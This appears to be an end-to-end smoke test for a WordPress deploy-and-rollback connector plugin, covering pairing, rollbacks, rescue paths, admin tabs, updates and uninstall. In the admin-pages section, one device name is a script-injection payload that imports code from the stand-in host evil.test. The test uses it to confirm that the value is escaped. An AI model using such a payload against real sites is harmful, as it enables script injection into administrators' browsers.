/**
 * End-to-end checks against a real WordPress in Docker: pairing, a full deploy with manual
 * rollback, a syntax refusal, a health-check rollback, a fatal-error rollback by the guard, the
 * confirmation deadline, rescue through rescue.php when another mu-plugin is broken, and
 * `wp runova rescue`. Run with: node scripts/wordpress-connector.mjs smoke
 *
 * RUNOVA_WPC_PORT picks the port (18990); RUNOVA_WPC_KEEP=1 leaves the site running.
 */
import { readFileSync } from 'node:fs';
import { forms, login } from './admin.mjs';
import { putOp, SiteClient, sha } from './client.mjs';
import { connectorZip, startWordPressFixture } from './fixture.mjs';
import { request } from './http.mjs';
import { connectorRelease, nextVersion, sendConnectorUpdate, sourceVersion } from './release.mjs';

const port = Number(process.env.RUNOVA_WPC_PORT || 18990);
let failures = 0;

/** This file is a command-line runner; its output is the report. */
const say = (line) => process.stdout.write(`${line}\n`);

function check(condition, label, detail) {
  if (condition) {
    say(`  ok    ${label}`);
  } else {
    failures++;
    say(
      `  FAIL  ${label}${detail === undefined ? '' : `\n        ${JSON.stringify(detail).slice(0, 600)}`}`,
    );
  }
}

const sleep = (ms) => new Promise((done) => setTimeout(done, ms));
const wire = (ops) => ops.map(({ content, ...op }) => op);

async function deploy(client, label, items, ops) {
  const begin = await client.call('/deploy/begin', { label, items, ops: wire(ops) });
  if (!begin.ok || !begin.data.deployId) return { begin };
  const deployId = begin.data.deployId;
  const chunks = [];
  const blobs = [];
  ops.forEach((op, index) => {
    if (op.op === 'put') {
      chunks.push({ op: index, offset: 0, final: true });
      blobs.push(op.content);
    }
  });
  const upload = await client.call('/deploy/upload', { deployId, chunks }, { blobs });
  const commit = await client.call('/deploy/commit', { deployId });
  return { begin, upload, commit, deployId };
}

async function hashes(client, item) {
  const out = {};
  let cursor = null;
  do {
    const page = await client.call('/items/manifest', { item, cursor });
    if (!page.ok) throw new Error(`manifest: ${JSON.stringify(page.error)}`);
    for (const entry of page.data.entries) out[entry.path] = entry.sha256;
    cursor = page.data.cursor;
  } while (cursor);
  return out;
}

async function readText(client, item, path) {
  const reply = await client.call('/files/read', { item, files: [{ path }] });
  return reply.ok && !reply.data.files[0].missing ? reply.blobs[0].toString('utf8') : null;
}

async function homeStatus(url) {
  const response = await request(`${url}/?runova_smoke=${Date.now()}`, { redirect: 'manual' });
  return response.status;
}

const site = await startWordPressFixture({ port });
say(`WordPress fixture on ${site.url}`);
try {
  site.wp(['plugin', 'activate', 'hello']);
  const client = new SiteClient(site.keyFor('write', { label: 'Smoke' }));

  say('Pairing');
  const hello = await client.call('/hello', {}, { unsigned: true });
  check(hello.verified && hello.ok, '/hello is signed by the key in the connection key');
  check(
    hello.data.capabilities.includes('deploy') && hello.data.capabilities.includes('rescue'),
    'capabilities include deploy and rescue',
    hello.data.capabilities,
  );
  check(
    typeof hello.data.rescueUrl === 'string' && hello.data.rescueUrl.startsWith(`${site.url}/`),
    'rescueUrl is on the site origin',
    hello.data.rescueUrl,
  );
  client.rescueUrl = hello.data.rescueUrl;
  await client.pair();
  const info = (await client.call('/site/info')).data;
  check(info.guard.installed === true, 'the guard mu-plugin is installed', info.guard);
  check(
    info.filesystemMethod === 'direct' && info.sodium === 'native',
    'direct writes, native sodium',
    info,
  );
  const theme = { kind: 'theme', slug: info.activeTheme.stylesheet };
  const themeFiles = await hashes(client, theme);
  const functionsOld = (await readText(client, theme, 'functions.php')) ?? '<?php\n';
  const functionsSha = themeFiles['functions.php'] ?? null;

  say('Full deploy, confirm, then manual rollback');
  {
    const ops = [
      putOp(theme, 'functions.php', `${functionsOld}\n// runova smoke deploy\n`, functionsSha),
      putOp(theme, 'runova-smoke/added.php', '<?php // added by the smoke test\n', null),
    ];
    const run = await deploy(client, 'Smoke: full deploy', [theme], ops);
    check(
      run.commit?.ok && run.commit.data.state === 'applied',
      'commit applies',
      run.commit ?? run.begin,
    );
    const verify = await client.call('/deploy/verify', { deployId: run.deployId });
    check(
      verify.ok && verify.data.state === 'applied' && verify.data.healthy === true,
      'loopback health checks pass',
      verify.data,
    );
    const finalize = await client.call('/deploy/finalize', { deployId: run.deployId });
    check(finalize.ok && finalize.data.state === 'done', 'finalize', finalize);
    const onDisk = site.exec(`cat /var/www/html/wp-content/themes/${theme.slug}/functions.php`);
    check(onDisk.includes('runova smoke deploy'), 'the change is on the site');
    const history = await client.call('/deploy/history', { limit: 5 });
    check(
      history.data.deploys[0].deployId === run.deployId && history.data.deploys[0].canRollback,
      'history can roll it back',
      history.data.deploys[0],
    );
    const rollback = await client.call('/deploy/rollback', { deployId: run.deployId });
    check(
      rollback.ok && rollback.data.state === 'rolledBack' && rollback.data.removed === 1,
      'manual rollback',
      rollback.data,
    );
    const after = await hashes(client, theme);
    check(
      after['functions.php'] === functionsSha && !after['runova-smoke/added.php'],
      'files are back as they were',
    );
  }

  say('Syntax error is refused');
  {
    const ops = [
      putOp(
        theme,
        'functions.php',
        `${functionsOld}\nfunction runova_smoke_broken( {\n`,
        functionsSha,
      ),
    ];
    const run = await deploy(client, 'Smoke: syntax', [theme], ops);
    check(
      run.commit.ok &&
        run.commit.data.state === 'open' &&
        run.commit.data.syntaxErrors?.[0]?.path === 'functions.php',
      'commit refuses with the syntax error',
      run.commit.data,
    );
    const abort = await client.call('/deploy/abort', { deployId: run.deployId });
    check(abort.ok && abort.data.state === 'aborted', 'abort', abort);
    check((await hashes(client, theme))['functions.php'] === functionsSha, 'nothing changed');
  }

  say('Health check rolls back a deploy that breaks the home page');
  {
    const broken = `${functionsOld}\nadd_action('template_redirect', function () { status_header(500); exit('runova smoke: broken on purpose'); });\n`;
    const run = await deploy(
      client,
      'Smoke: health',
      [theme],
      [putOp(theme, 'functions.php', broken, functionsSha)],
    );
    check(run.commit.ok && run.commit.data.state === 'applied', 'commit applies', run.commit);
    const verify = await client.call('/deploy/verify', { deployId: run.deployId });
    check(
      verify.ok && verify.data.state === 'rolledBack' && verify.data.healthy === false,
      'verify rolls back',
      verify.data,
    );
    check((await homeStatus(site.url)) === 200, 'the home page works again');
  }

  say('A fatal error in a changed file is rolled back by the guard');
  {
    const plugin = { kind: 'plugin', slug: 'hello.php' };
    const before = await hashes(client, plugin);
    const fatal = '<?php\n/*\nPlugin Name: Hello Dolly\n*/\nrunova_smoke_undefined_function();\n';
    const run = await deploy(
      client,
      'Smoke: fatal',
      [plugin],
      [putOp(plugin, 'hello.php', fatal, before['hello.php'])],
    );
    check(run.commit.ok && run.commit.data.state === 'applied', 'commit applies', run.commit);
    const verify = await client.call('/deploy/verify', { deployId: run.deployId });
    check(
      verify.foreign === true && verify.status === 500,
      'the next request dies of the fatal error',
      verify,
    );
    const status = await client.call('/rescue/status');
    check(
      status.ok && status.verified && status.data.pending === null,
      'nothing is pending any more',
      status.data,
    );
    check(
      status.data.last?.deployId === run.deployId && status.data.last.reason === 'fatalError',
      'rolled back for the fatal error',
      status.data.last,
    );
    check(
      sha(Buffer.from(site.exec('cat /var/www/html/wp-content/plugins/hello.php'))) ===
        before['hello.php'],
      'hello.php is restored',
    );

    say('The guard answers /rescue/* on the normal URLs while a plugin is broken');
    const again = await deploy(
      client,
      'Smoke: rescue through the guard',
      [plugin],
      [putOp(plugin, 'hello.php', fatal, before['hello.php'])],
    );
    check(again.commit.ok && again.commit.data.state === 'applied', 'commit applies', again.commit);
    for (const via of ['rest', 'ajax']) {
      const pending = await client.call('/rescue/status', {}, { via });
      check(
        pending.ok && pending.verified && pending.data.pending?.deployId === again.deployId,
        `/rescue/status through ${via} sees the pending deploy`,
        pending,
      );
    }
    const rollback = await client.call('/rescue/rollback', { deployId: again.deployId });
    check(
      rollback.ok && rollback.verified && rollback.data.state === 'rolledBack',
      '/rescue/rollback through REST, served before plugins load',
      rollback,
    );
    check((await homeStatus(site.url)) === 200, 'the site works again');
    check(
      sha(Buffer.from(site.exec('cat /var/www/html/wp-content/plugins/hello.php'))) ===
        before['hello.php'],
      'hello.php is restored again',
    );
  }

  say('An unconfirmed deploy rolls back at its deadline');
  {
    site.wp(['config', 'set', 'RUNOVA_CONNECTOR_CONFIRM_SECONDS', '5', '--raw']);
    // Apache's opcache rechecks wp-config.php every 2 seconds.
    await sleep(3000);
    const ops = [putOp(theme, 'runova-smoke/deadline.txt', 'temporary', null)];
    const run = await deploy(client, 'Smoke: deadline', [theme], ops);
    check(run.commit.ok && run.commit.data.state === 'applied', 'commit applies', run.commit);
    await sleep(7000);
    // Any page view after the deadline lets the guard roll it back.
    await homeStatus(site.url);
    const status = await client.call('/rescue/status');
    check(
      status.data.last?.deployId === run.deployId && status.data.last.reason === 'notConfirmed',
      'rolled back as notConfirmed',
      status.data,
    );
    check(!(await hashes(client, theme))['runova-smoke/deadline.txt'], 'the file is gone again');
    site.wp(['config', 'delete', 'RUNOVA_CONNECTOR_CONFIRM_SECONDS']);
  }

  say('rescue.php rolls back when a broken mu-plugin stops WordPress before the guard');
  {
    const mu = { kind: 'mu-plugin', slug: '0-runova-smoke-broken.php' };
    const ops = [putOp(mu, mu.slug, '<?php\nrunova_smoke_undefined_function();\n', null)];
    const run = await deploy(client, 'Smoke: broken mu-plugin', [{ ...mu, create: true }], ops);
    check(
      run.commit?.ok && run.commit.data.state === 'applied',
      'commit applies',
      run.commit ?? run.begin,
    );
    check((await homeStatus(site.url)) === 500, 'the whole site is down');
    const viaRest = await client.call('/rescue/status');
    check(viaRest.foreign === true, 'the REST API is down too');
    const status = await client.call('/rescue/status', {}, { via: 'rescue' });
    check(
      status.ok && status.verified && status.data.pending?.deployId === run.deployId,
      'rescue.php sees the pending deploy',
      status,
    );
    const rollback = await client.call(
      '/rescue/rollback',
      { deployId: run.deployId },
      { via: 'rescue' },
    );
    check(
      rollback.ok && rollback.verified && rollback.data.state === 'rolledBack',
      'rescue.php rolls it back',
      rollback,
    );
    check((await homeStatus(site.url)) === 200, 'the site is back');
    check(
      site
        .exec(`test -e /var/www/html/wp-content/mu-plugins/${mu.slug} && echo there || echo gone`)
        .trim() === 'gone',
      'the broken mu-plugin is gone',
    );
  }

  say('wp runova rescue');
  {
    const run = await deploy(
      client,
      'Smoke: cli',
      [theme],
      [putOp(theme, 'runova-smoke/cli.txt', 'cli', null)],
    );
    check(run.commit.ok && run.commit.data.state === 'applied', 'commit applies', run.commit);
    const status = site.wp(['runova', 'rescue', 'status', '--skip-plugins']);
    check(
      status.includes(run.deployId) && status.includes('applied'),
      'status names the pending deploy',
      status,
    );
    const rollback = site.wp(['runova', 'rescue', 'rollback', '--yes', '--skip-plugins']);
    check(rollback.includes('rolledBack'), 'rollback from the command line', rollback);
  }

  say('Read-only keys cannot deploy');
  {
    const reader = new SiteClient(site.keyFor('read'));
    await reader.pair('Reader');
    const begin = await reader.call('/deploy/begin', { label: 'nope', items: [theme], ops: [] });
    check(begin.verified && begin.error?.code === 'readOnly', 'readOnly on a write route', begin);
  }

  say('wp-admin pages');
  {
    const admin = await login(site.url, 'admin', 'admin');
    const page = '/wp-admin/tools.php?page=runova-connector';
    for (const tab of ['keys', 'connections', 'deploys', 'audit', 'status']) {
      const view = await admin.get(`${page}&tab=${tab}`);
      check(
        view.status === 200 &&
          view.text.includes('nav-tab-active') &&
          !/Fatal error|Warning:|Notice:/.test(view.text),
        `the ${tab} tab renders`,
        view.status,
      );
    }
    const status = await admin.get(`${page}&tab=status`);
    for (const id of ['loopback', 'guard', 'fileMods', 'filesystem', 'dataDir', 'version']) {
      const row = status.text.match(new RegExp(`<tr data-check="${id}">([\\s\\S]*?)</tr>`))?.[1];
      check(row?.includes('dashicons-yes-alt') === true, `status tab: ${id} is OK`, row);
    }

    const keys = await admin.get(`${page}&tab=keys`);
    const createForm = forms(keys.text).find(
      (form) => form.runova_connector_action === 'create_key',
    );
    const created = await admin.post(page, {
      ...createForm,
      scope: 'read',
      label: 'From wp-admin',
      expires: '7',
    });
    const adminKey = created.text.match(/amwp1\.[A-Za-z0-9_-]+/)?.[0];
    check(created.status === 200 && adminKey !== undefined, 'the Keys tab makes a key');
    const viaAdmin = new SiteClient(adminKey);
    await viaAdmin.pair('Admin key');
    // A read key holder names their device to break out of an attribute; it must stay text.
    const hostile = new SiteClient(site.keyFor('read'));
    await hostile.pair(`&quot;+import('//evil.test/x.js')+&quot;`);

    const connections = await admin.get(`${page}&tab=connections`);
    // Our part of the page: from the tab's heading to the end of its content area.
    const ours = connections.text.slice(
      connections.text.indexOf('<div class="wrap">'),
      connections.text.indexOf(
        '<div class="clear"></div>',
        connections.text.indexOf('<div class="wrap">'),
      ),
    );
    const handlers = (ours.match(/<[a-z][^>]*>/gi) ?? []).filter((tag) =>
      /\son[a-z]+\s*=/i.test(tag.replace(/"[^"]*"/g, '""')),
    );
    check(
      ours.length > 0 && handlers.length === 0,
      'no inline event handlers on the page',
      handlers,
    );
    check(ours.includes('data-runova-confirm'), 'confirmations are plain data attributes');
    check(
      /<script[^>]*id="runova-connector-admin-js-after"/.test(connections.text),
      'the one enqueued script is on the page',
    );
    const revokeForm = forms(connections.text).find(
      (form) => form.runova_connector_action === 'revoke' && form.id === viaAdmin.connectionId,
    );
    check(revokeForm !== undefined, 'the Connections tab lists it with a Revoke button');
    check(
      (await admin.post(page, { ...revokeForm, _wpnonce: '' })).status === 403,
      'revoke without a nonce: 403',
    );
    check(
      (await admin.post(page, { ...revokeForm, id: client.connectionId })).status === 403,
      'a nonce made for another connection: 403',
    );
    site.wp([
      'user',
      'create',
      'editor',
      'editor@example.test',
      '--role=editor',
      '--user_pass=editor',
    ]);
    const editor = await login(site.url, 'editor', 'editor');
    check((await editor.get(page)).status === 403, 'an editor cannot open the page');
    check((await editor.post(page, revokeForm)).status === 403, 'an editor cannot revoke');
    const revoked = await admin.post(page, revokeForm);
    check(
      revoked.status === 302 && revoked.location?.includes('runova_notice=revoked'),
      'revoke works and redirects',
      revoked.location,
    );
    const notice = await admin.get(revoked.location.slice(site.url.length));
    check(notice.text.includes('The connection is revoked'), 'the notice says so');
    const refused = await viaAdmin.call('/site/info');
    check(refused.verified && refused.error?.code === 'revoked', 'the revoked key is refused');

    const run = await deploy(
      client,
      'Smoke: admin rollback',
      [theme],
      [putOp(theme, 'runova-smoke/admin.txt', 'admin rollback', null)],
    );
    await client.call('/deploy/verify', { deployId: run.deployId });
    await client.call('/deploy/finalize', { deployId: run.deployId });
    const deploys = await admin.get(`${page}&tab=deploys`);
    const rollbackForm = forms(deploys.text).find(
      (form) => form.runova_connector_action === 'rollback' && form.id === run.deployId,
    );
    check(rollbackForm !== undefined, 'the Deploys tab offers Roll back');
    // Apache's opcache rechecks wp-config.php every 2 seconds, so give a change time to land.
    site.wp(['config', 'set', 'DISALLOW_FILE_MODS', 'true', '--raw']);
    await sleep(3000);
    check(
      (await admin.post(page, rollbackForm)).status === 403,
      'with DISALLOW_FILE_MODS nobody has the rights to roll back: 403',
    );
    site.wp(['config', 'delete', 'DISALLOW_FILE_MODS']);
    await sleep(3000);
    const rolled = await admin.post(page, rollbackForm);
    check(
      rolled.status === 302 && rolled.location?.includes('runova_notice=rolledBack'),
      'roll back from wp-admin',
      rolled.location,
    );
    check(!(await hashes(client, theme))['runova-smoke/admin.txt'], 'the deployed file is gone');
    const audit = await admin.get(`${page}&tab=audit`);
    check(
      audit.text.includes('Connection revoked') && audit.text.includes('Deploy rolled back'),
      'the audit log shows the revoke and the rollback',
    );
    const older = await admin.get(`${page}&tab=audit&before=3`);
    check(
      older.status === 200 &&
        older.text.includes('>Newest<') &&
        !older.text.includes('Connection revoked'),
      'the audit log pages back to older entries',
    );
  }

  say('WP-CLI commands');
  {
    const list = JSON.parse(site.wp(['runova', 'connections', 'list', '--format=json']));
    check(
      list.some((row) => row.id === client.connectionId && row.status === 'active'),
      'connections list',
    );
    const checks = JSON.parse(site.wp(['runova', 'status', '--format=json']));
    check(
      checks.length >= 10 && checks.find((row) => row.check === 'Recovery guard')?.result === 'ok',
      'status',
      checks,
    );
    const deploys = JSON.parse(site.wp(['runova', 'deploys', 'list', '--format=json']));
    check(deploys[0]?.label === 'Smoke: admin rollback', 'deploys list', deploys[0]);
    const doomed = new SiteClient(site.keyFor('read'));
    await doomed.pair('Revoked from WP-CLI');
    site.wp(['runova', 'connections', 'revoke', doomed.connectionId, '--yes']);
    check((await doomed.call('/site/info')).error?.code === 'revoked', 'connections revoke');
  }

  // The fixture logs with WP_DEBUG; the smoke's own broken files are expected in there, ours are not.
  const debugLog = site.exec('cat /var/www/html/wp-content/debug.log 2>/dev/null || true', {
    allowFail: true,
  });
  const ours = debugLog
    .split('\n')
    .filter((line) => /runova-connector|Runova Connector/i.test(line));
  check(
    ours.length === 0,
    'no notices, warnings or errors from the connector in debug.log',
    ours.slice(0, 5),
  );
  check(
    /runova_smoke_undefined_function/.test(debugLog),
    'debug.log is on (it holds the smoke fatal)',
  );

  say('Connector update from the app');
  {
    const current = (await client.call('/site/info')).data.pluginVersion;
    const next = nextVersion(current);
    const release = (version, edit) => connectorRelease(sourceVersion(), version, edit);
    const send = (files, version, who = client, wrongHash = false) =>
      sendConnectorUpdate(who, files, version, wrongHash);
    const pluginsLs = () => site.exec('ls -A /var/www/html/wp-content/plugins');

    const before = (await client.call('/site/info')).data;
    check(before.selfUpdate === true, '/site/info says the connector can replace itself', before);

    const reader = new SiteClient(site.keyFor('read'));
    await reader.pair('Update reader');
    const asReader = await send(release(next), next, reader);
    check(asReader.verified && asReader.error?.code === 'readOnly', 'a read key cannot update');

    const older = await send(release('0.0.1'), '0.0.1');
    check(
      older.verified &&
        older.error?.code === 'updateRefused' &&
        older.error.details?.reason === 'downgrade',
      'an older release is refused',
      older,
    );

    const bad = await send(release(next), next, client, true);
    check(
      bad.verified &&
        bad.error?.code === 'updateRefused' &&
        bad.error.details?.reason === 'badPackage',
      'a file that does not match its hash is refused',
      bad,
    );

    // A release that breaks the site at load: the health check fails and the old folder comes back.
    const broken = await send(
      release(next, (files) => {
        const plugin = files.get('src/Plugin.php').toString('utf8');
        const patched = plugin.replace(
          /public static function boot\(\): void\n {4}\{\n/,
          'public static function boot(): void\n    {\n        runova_smoke_update_fatal();\n',
        );
        files.set('src/Plugin.php', Buffer.from(patched));
      }),
      next,
    );
    check(
      broken.verified && broken.ok && broken.data.state === 'rolledBack',
      'a release that breaks the site is rolled back by the plugin',
      broken.data ?? broken,
    );
    check((await homeStatus(site.url)) === 200, 'the site still answers');
    const afterBroken = await client.call('/site/info');
    check(
      afterBroken.verified && afterBroken.data.pluginVersion === current,
      'the old version is running again',
      afterBroken.data?.pluginVersion,
    );
    check(!/\.runova-connector/.test(pluginsLs()), 'no staging folder is left beside the plugin');

    const update = await send(release(next), next);
    check(
      update.verified && update.ok && update.data.state === 'updated',
      'the update goes through',
      update.data ?? update,
    );
    const after = await client.call('/site/info');
    check(
      after.verified && after.ok && after.data.pluginVersion === next,
      'the new version answers with a signed reply',
      after.data?.pluginVersion ?? after,
    );
    check(
      site
        .exec(
          'test -f /var/www/html/wp-content/plugins/runova-connector/src/SmokeMarker.php && echo there || echo gone',
        )
        .trim() === 'there',
      'the new files are in the plugin folder',
    );
    check(!/\.runova-connector/.test(pluginsLs()), 'no staging folder is left beside the plugin');
    check(
      site.wp(['plugin', 'list', '--status=active', '--field=name']).includes('runova-connector'),
      'the connector is still active',
    );
    check(
      site
        .exec(
          'grep -m1 "Version:" /var/www/html/wp-content/mu-plugins/00-runova-connector-guard.php',
        )
        .includes(next),
      'the guard was rewritten for the new version',
    );
    check((await homeStatus(site.url)) === 200, 'the site works on the new version');

    const run = await deploy(
      client,
      'Smoke: after the update',
      [theme],
      [putOp(theme, 'runova-smoke/after-update.txt', 'still deploys', null)],
    );
    check(run.commit?.ok && run.commit.data.state === 'applied', 'a deploy still applies', run);
    const undone = await client.call('/deploy/rollback', { deployId: run.deployId });
    check(undone.ok && undone.data.state === 'rolledBack', 'and rolls back', undone);

    const admin = await login(site.url, 'admin', 'admin');
    const audit = await admin.get('/wp-admin/tools.php?page=runova-connector&tab=audit');
    check(
      audit.text.includes('Connector updated') && audit.text.includes('Connector update undone'),
      'the audit log shows the update and the undone one',
    );
  }

  say('A copy of the site at another address gets its own key');
  {
    // What a staging copy looks like from inside: the stored key says it belongs elsewhere.
    const stored = JSON.parse(site.wp(['option', 'get', 'agentmate_connector_site_key'])); // legacy-name
    stored.home = 'https://original.example.test';
    site.wp(['option', 'update', 'agentmate_connector_site_key', JSON.stringify(stored)]); // legacy-name
    const hello = await client.call('/hello', {}, { unsigned: true });
    check(
      hello.ok && hello.data.sitePublicKey !== client.key.sitePublicKey && hello.verified === false,
      'the key is renewed, so the pinned key no longer matches',
    );
    const after = await client.call('/site/info');
    check(after.error?.code === 'revoked', 'every connection was revoked', after.error);
    const detail = site.wp([
      'db',
      'query',
      "SELECT detail FROM wp_agentmate_audit WHERE detail LIKE 'This site%' ORDER BY id DESC LIMIT 1", // legacy-name
      '--skip-column-names',
    ]);
    check(
      detail.includes("This site's address changed from https://original.example.test to"),
      'the audit log says why',
      detail,
    );
  }

  say('Uninstall removes only what the connector made');
  {
    const fingerprint = () =>
      site.exec(
        "cd /var/www/html/wp-content && find themes plugins mu-plugins -type f -not -path 'plugins/runova-connector/*' -not -name '00-runova-connector-guard.php' -exec sha256sum {} + | sort",
      );
    const before = fingerprint();
    const dataDir = site.wp(['option', 'get', 'agentmate_connector_data_dir']); // legacy-name
    site.wp(['plugin', 'deactivate', 'runova-connector']);
    const guard = '/var/www/html/wp-content/mu-plugins/00-runova-connector-guard.php';
    check(
      site.exec(`test -e ${guard} && echo there || echo gone`).trim() === 'gone',
      'deactivation removes the guard',
    );
    site.wp(['plugin', 'uninstall', 'runova-connector']);
    // The tables kept the names the plugin gave them before the rename.
    const showTables = "SHOW TABLES LIKE '%agentmate%'"; // legacy-name
    const tables = site.wp(['db', 'query', showTables, '--skip-column-names']);
    check(tables === '', 'its tables are dropped', tables);
    for (const option of [
      'agentmate_connector_site_key', // legacy-name
      'agentmate_connector_data_dir', // legacy-name
      'agentmate_connector_guard', // legacy-name
      'agentmate_connector_db_version', // legacy-name
    ]) {
      check(
        site.wp(['option', 'get', option], { allowFail: true }) === '',
        `option ${option} is gone`,
      );
    }
    check(
      site.exec(`test -e /var/www/html/wp-content/${dataDir} && echo there || echo gone`).trim() ===
        'gone',
      'its data folder is gone',
    );
    check(fingerprint() === before, 'not one theme, plugin or mu-plugin file changed');
  }

  say('Installing the zip through the wp-admin upload form');
  {
    const admin = await login(site.url, 'admin', 'admin');
    const upload = await admin.get('/wp-admin/plugin-install.php?tab=upload');
    const form = forms(upload.text).find((fields) => 'pluginzip' in fields);
    const body = new FormData();
    body.set('_wpnonce', form._wpnonce);
    body.set('_wp_http_referer', form._wp_http_referer ?? '');
    body.set('install-plugin-submit', 'Install Now');
    body.set('pluginzip', new Blob([readFileSync(connectorZip())]), 'runova-connector.zip');
    const installed = await admin.upload('/wp-admin/update.php?action=upload-plugin', body);
    check(
      installed.status === 200 && /Plugin installed successfully/i.test(installed.text),
      'the zip installs from Plugins > Add New > Upload',
      installed.text
        .replace(/<[^>]+>/g, ' ')
        .replace(/\s+/g, ' ')
        .slice(-300),
    );
    site.wp(['plugin', 'activate', 'runova-connector']);
    const fresh = new SiteClient(site.keyFor('write'));
    await fresh.pair('After reinstall');
    const info = await fresh.call('/site/info');
    check(
      info.ok && info.verified && info.data.guard.installed,
      'pairs and works after a fresh install',
    );
  }
} finally {
  if (process.env.RUNOVA_WPC_KEEP === '1') {
    say(`Left running: ${site.url}`);
  } else {
    site.stop();
  }
}

if (failures > 0) {
  say(`\n${failures} smoke check(s) failed.`);
  process.exit(1);
}
say('\nAll smoke checks passed.');
